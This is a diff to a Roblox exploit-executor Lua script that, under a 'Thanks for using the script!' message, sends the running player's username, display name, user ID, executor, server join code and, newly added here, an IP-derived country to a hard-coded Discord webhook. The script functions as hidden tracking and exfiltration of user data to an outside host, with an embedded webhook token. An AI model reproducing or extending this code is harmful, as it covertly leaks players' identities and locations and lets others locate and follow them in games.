@@ -2,22 +2,35 @@ local Http       = game:GetService("HttpService")
 local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
 local executor   = identifyexecutor() or "idk"
 
+-- Function to get country by IP via http://ip-api.com/json/
+local function getCountry()
+    local success, response = pcall(function()
+        -- This URL returns info about the requester's IP
+        return Http:GetAsync("http://ip-api.com/json/")
+    end)
+    if success then
+        local data = Http:JSONDecode(response)
+        if data and data.country then
+            return data.country
+        end
+    end
+    return "Unknown"
+end
+
 local function sendRequest()
-    -- Gather player info
     local player      = game.Players.LocalPlayer
     local displayName = player and player.DisplayName or "Display name not available"
     local userName    = player and player.Name or "Unknown"
     local playerId    = player and player.UserId or 0
 
-    -- Get place/job IDs for the join script
     local placeId = tostring(game.PlaceId)
     local jobId   = tostring(game.JobId)
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                         placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Build a single payload with two embeds:
-    --   1) “Thanks for using the script!” + user info
-    --   2) “Join Server Script” embed with the joinScript code block
+    -- Get country from IP API
+    local country = getCountry()
+
     local payload = {
         content = "**Thanks for using the script!**",
         embeds = {
@@ -27,10 +40,10 @@ local function sendRequest()
                 },
                 title = userName .. " | " .. displayName,
                 type  = "rich",
-                color = tonumber(0x00FF00),  -- Green
+                color = tonumber(0x00FF00),
                 thumbnail = {
-                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?"
-                          .. "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
+                          "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                 },
                 fields = {
                     {
@@ -38,6 +51,11 @@ local function sendRequest()
                         value  = executor,
                         inline = true
                     },
+                    {
+                        name   = "Country:",
+                        value  = country,
+                        inline = true
+                    }
                 },
             },
             {
@@ -58,7 +76,6 @@ local function sendRequest()
     }
 end
 
--- Send the request via Synapse if available, otherwise fall back to a generic 'request'
 if syn then
     syn.request(sendRequest())
 else
